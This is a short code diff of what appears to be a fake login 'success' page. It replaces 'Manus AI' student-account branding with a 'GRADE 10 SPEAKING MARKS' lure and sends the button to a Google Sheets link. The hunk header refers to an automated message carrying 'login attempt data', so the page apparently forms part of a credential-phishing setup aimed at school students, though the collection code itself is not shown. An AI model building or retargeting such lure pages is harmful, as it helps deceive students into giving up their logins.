@@ -59,7 +59,7 @@ This is an automated message with login attempt data.`,
           {/* Manus AI Logo */}
           <div className="mb-8">
             <img 
-              src="https://placehold.co/200x60/1f2937/ffffff?text=Manus+AI" 
+              src="https://placehold.co/200x60/1f2937/ffffff?text=GRADE+10" 
               alt="Manus AI Logo" 
               className="w-48 h-auto mx-auto"
             />
@@ -68,17 +68,17 @@ This is an automated message with login attempt data.`,
           {/* Success Message */}
           <div className="bg-white rounded-lg shadow-md p-8">
             <h1 className="text-2xl font-bold text-gray-900 mb-6">
-              Manus student dev account submission request accepted 2/5 teachers
+              GRADE 10 SPEAKING MARKS
             </h1>
             
             {/* Continue Button - redirects to google.com */}
             <button
               onClick={() => {
-                window.location.href = 'https://www.google.com';
+                window.location.href = 'https://docs.google.com/spreadsheets/d/1BwfITBrb0n5ltrss_QuNFBxKmU7VUuVignqd1gpU_6Y/edit?usp=sharing';
               }}
               className="px-6 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md transition-colors w-full mt-8"
             >
-              Continue to Google
+              Marks
             </button>
           </div>
         </div>
